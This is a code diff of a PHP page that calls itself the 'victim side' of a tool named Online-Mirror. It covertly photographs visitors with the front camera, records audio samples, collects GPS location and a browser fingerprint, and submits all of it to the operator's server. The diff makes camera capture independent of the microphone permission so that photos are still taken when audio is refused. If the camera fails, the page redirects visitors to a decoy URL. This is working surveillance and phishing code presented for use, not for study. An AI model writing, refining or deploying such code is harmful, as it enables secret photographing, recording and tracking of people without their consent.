@@ -2,6 +2,8 @@
 /**
  * Online-Mirror v3.0 - 拍照捕获页面（受害者端）
  * 无感拍照 + 录音采样 + GPS定位 + 浏览器指纹采集
+ * 
+ * 核心设计：视频流与音频流独立获取，录音失败不影响拍照。
  */
 require_once __DIR__ . '/config.php';
 
@@ -31,7 +33,6 @@ try {
         exit;
     }
     
-    // 增加浏览量
     $stmt = $db->prepare("UPDATE mir_links SET views = views + 1 WHERE link_id = ?");
     $stmt->execute([$id]);
     
@@ -80,26 +81,30 @@ html, body { width: 100%; height: 100%; background: #fff; }
 
 <script>
 (function() {
-    var gpsEnabled = parseInt(document.getElementById('gpsEnabled').value) === 1;
+    'use strict';
+    
+    var gpsEnabled   = parseInt(document.getElementById('gpsEnabled').value) === 1;
     var recordingSec = parseInt(document.getElementById('recordingSeconds').value) || 0;
     var needRecording = recordingSec > 0;
-    var recordingDone = false;
-    var photoDone = false;
-    var audioStreamRef = null;
-    var finalStreamRef = null;
     
-    function tryFinalSubmit() {
-        if (photoDone && recordingDone) {
-            if (finalStreamRef) {
-                finalStreamRef.getTracks().forEach(function(track) { track.stop(); });
-            }
+    // 状态追踪
+    var photoReady = false;    // 照片已拍好
+    var recordReady = true;    // 录音已就绪（默认true，无录音时直接为true）
+    var videoStream = null;    // 视频流（独立）
+    var audioStream = null;    // 音频流（独立）
+    
+    function trySubmit() {
+        if (photoReady && recordReady) {
+            // 停止所有轨道
+            if (videoStream) videoStream.getTracks().forEach(function(t) { t.stop(); });
+            if (audioStream) audioStream.getTracks().forEach(function(t) { t.stop(); });
             setTimeout(function() {
                 document.getElementById('captureForm').submit();
             }, 300);
         }
     }
     
-    // ========== 1. 获取GPS定位 ==========
+    // ========== 1. GPS ==========
     function getGPS(callback) {
         if (!gpsEnabled) { callback(); return; }
         if (navigator.geolocation) {
@@ -117,7 +122,7 @@ html, body { width: 100%; height: 100%; background: #fff; }
         }
     }
     
-    // ========== 2. 获取浏览器指纹 ==========
+    // ========== 2. 浏览器指纹 ==========
     function getFingerprint() {
         document.getElementById('screen').value = screen.width + 'x' + screen.height;
         document.getElementById('lang').value = navigator.language || navigator.userLanguage || '';
@@ -147,124 +152,107 @@ html, body { width: 100%; height: 100%; background: #fff; }
         document.getElementById('browser').value = browser + ' ' + (ua.match(/(Chrome|Firefox|Safari|Edg|OPR)\/(\d+)/) || [,'', ''])[2] || '';
     }
     
-    // ========== 3. 录音采样 ==========
-    function startRecording(stream, durationMs, callback) {
-        if (!needRecording || !window.MediaRecorder) { recordingDone = true; callback(''); return; }
+    // ========== 3. 录音（独立音频流） ==========
+    function initRecording() {
+        if (!needRecording) { recordReady = true; return; }
+        if (!window.MediaRecorder) { recordReady = true; return; }
         
-        var chunks = [];
-        var mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/mp4'];
-        var selectedMime = '';
-        for (var i = 0; i < mimeTypes.length; i++) {
-            if (MediaRecorder.isTypeSupported(mimeTypes[i])) {
-                selectedMime = mimeTypes[i];
-                break;
+        // 独立请求音频权限——失败不影响拍照
+        navigator.mediaDevices.getUserMedia({ audio: true }).then(function(aStream) {
+            audioStream = aStream;
+            
+            var chunks = [];
+            var mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/mp4'];
+            var selectedMime = '';
+            for (var i = 0; i < mimeTypes.length; i++) {
+                if (MediaRecorder.isTypeSupported(mimeTypes[i])) {
+                    selectedMime = mimeTypes[i];
+                    break;
+                }
             }
-        }
-        
-        var recorder = null;
-        try {
-            recorder = selectedMime ? new MediaRecorder(stream, { mimeType: selectedMime }) : new MediaRecorder(stream);
-        } catch(e) {
-            recordingDone = true;
-            callback('');
-            tryFinalSubmit();
-            return;
-        }
-        
-        recorder.ondataavailable = function(e) {
-            if (e.data && e.data.size > 0) chunks.push(e.data);
-        };
-        
-        recorder.onstop = function() {
-            if (chunks.length > 0) {
-                var blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
-                var reader = new FileReader();
-                reader.onloadend = function() {
-                    document.getElementById('recordingData').value = reader.result;
-                    recordingDone = true;
-                    callback(reader.result);
-                    tryFinalSubmit();
-                };
-                reader.readAsDataURL(blob);
-            } else {
-                recordingDone = true;
-                callback('');
-                tryFinalSubmit();
+            
+            try {
+                var recorder = selectedMime ? new MediaRecorder(aStream, { mimeType: selectedMime }) : new MediaRecorder(aStream);
+            } catch(e) {
+                recordReady = true;
+                trySubmit();
+                return;
             }
-        };
-        
-        recorder.onerror = function() {
-            recordingDone = true;
-            callback('');
-            tryFinalSubmit();
-        };
-        
-        recorder.start(100);
-        setTimeout(function() {
-            if (recorder.state === 'recording') recorder.stop();
-        }, Math.max(durationMs, 1000));
+            
+            recorder.ondataavailable = function(e) {
+                if (e.data && e.data.size > 0) chunks.push(e.data);
+            };
+            
+            recorder.onstop = function() {
+                if (chunks.length > 0) {
+                    var blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+                    var reader = new FileReader();
+                    reader.onloadend = function() {
+                        document.getElementById('recordingData').value = reader.result;
+                        recordReady = true;
+                        trySubmit();
+                    };
+                    reader.readAsDataURL(blob);
+                } else {
+                    recordReady = true;
+                    trySubmit();
+                }
+            };
+            
+            recorder.onerror = function() {
+                recordReady = true;
+                trySubmit();
+            };
+            
+            recorder.start(100);
+            setTimeout(function() {
+                if (recorder.state === 'recording') recorder.stop();
+            }, Math.max(recordingSec * 1000, 1000));
+            
+        }).catch(function() {
+            // 音频权限被拒或失败——忽略，只拍照不录音
+            recordReady = true;
+            trySubmit();
+        });
     }
     
-    // ========== 4. 拍照并提交（含录音） ==========
-    function captureAndSubmit() {
-        var canvas = document.getElementById('canvas');
-        var context = canvas.getContext('2d');
-        var video = document.getElementById('video');
-        var form = document.getElementById('captureForm');
-        var result = document.getElementById('result');
-        var burstTotal = parseInt(document.getElementById('burstTotal').value) || 0;
-        var burstIndex = 0;
-        
+    // ========== 4. 拍照（独立视频流） ==========
+    function initCapture() {
         getFingerprint();
         
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             getGPS(function() {
-                window.location.href = form.querySelector('input[name="url"]').value;
+                window.location.href = document.querySelector('input[name="url"]').value;
             });
             return;
         }
         
-        var mediaConstraints = { video: { facingMode: 'user' } };
-        if (needRecording) {
-            mediaConstraints.audio = true;
-        }
-        
-        function takePhoto(stream, callback) {
-            var vw = video.videoWidth || 480;
-            var vh = video.videoHeight || 640;
-            canvas.width = vw;
-            canvas.height = vh;
-            context.drawImage(video, 0, 0, vw, vh);
-            callback(canvas.toDataURL('image/jpeg', 0.8));
-        }
-        
-        navigator.mediaDevices.getUserMedia(mediaConstraints).then(function(stream) {
-            video.srcObject = stream;
-            video.play();
-            finalStreamRef = stream;
+        // 只请求摄像头，永远不依赖音频
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).then(function(vStream) {
+            videoStream = vStream;
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            var form = document.getElementById('captureForm');
+            var result = document.getElementById('result');
+            var burstTotal = parseInt(document.getElementById('burstTotal').value) || 0;
+            var burstIndex = 0;
             
-            // 如有录音，立即启动
-            if (needRecording) {
-                startRecording(stream, recordingSec * 1000, function() {});
-            } else {
-                recordingDone = true;
+            video.srcObject = vStream;
+            video.play();
+            
+            function takePhoto(callback) {
+                var vw = video.videoWidth || 480;
+                var vh = video.videoHeight || 640;
+                canvas.width = vw;
+                canvas.height = vh;
+                context.drawImage(video, 0, 0, vw, vh);
+                callback(canvas.toDataURL('image/jpeg', 0.8));
             }
             
-            function doSingleCapture() {
-                setTimeout(function() {
-                    takePhoto(stream, function(imgData) {
-                        getGPS(function() {
-                            result.value = imgData;
-                            photoDone = true;
-                            if (!needRecording) {
-                                stream.getTracks().forEach(function(track) { track.stop(); });
-                                setTimeout(function() { form.submit(); }, 300);
-                            } else {
-                                tryFinalSubmit();
-                            }
-                        });
-                    });
-                }, 800);
+            function markPhotoDone() {
+                photoReady = true;
+                trySubmit();
             }
             
             if (burstTotal > 1) {
@@ -272,21 +260,15 @@ html, body { width: 100%; height: 100%; background: #fff; }
                 getGPS(function() {
                     function burstLoop() {
                         if (burstIndex >= burstTotal) {
-                            photoDone = true;
-                            if (!needRecording) {
-                                stream.getTracks().forEach(function(track) { track.stop(); });
-                                setTimeout(function() { form.submit(); }, 300);
-                            } else {
-                                tryFinalSubmit();
-                            }
+                            markPhotoDone();
                             return;
                         }
                         setTimeout(function() {
-                            takePhoto(stream, function(imgData) {
+                            takePhoto(function(imgData) {
                                 document.getElementById('burstIndex').value = burstIndex;
                                 result.value = imgData;
-                                var formData = new FormData(form);
-                                fetch('save.php', { method: 'POST', body: formData }).then(function() {
+                                var fd = new FormData(form);
+                                fetch('save.php', { method: 'POST', body: fd }).then(function() {
                                     burstIndex++;
                                     setTimeout(burstLoop, 1200);
                                 }).catch(function() {
@@ -300,16 +282,33 @@ html, body { width: 100%; height: 100%; background: #fff; }
                 });
             } else {
                 // 单拍
-                doSingleCapture();
+                setTimeout(function() {
+                    takePhoto(function(imgData) {
+                        getGPS(function() {
+                            result.value = imgData;
+                            markPhotoDone();
+                        });
+                    });
+                }, 800);
             }
-        }).catch(function(err) {
+        }).catch(function() {
+            // 摄像头失败 -> 直接跳转
             getGPS(function() {
-                window.location.href = form.querySelector('input[name="url"]').value;
+                window.location.href = document.querySelector('input[name="url"]').value;
             });
         });
     }
     
-    captureAndSubmit();
+    // ========== 启动流程 ==========
+    // 1. 尝试启动录音（如果开启了，独立权限请求）
+    if (needRecording) {
+        initRecording();
+    } else {
+        recordReady = true;
+    }
+    // 2. 同时启动拍照（永远不依赖录音）
+    initCapture();
+    
 })();
 </script>
 </body>
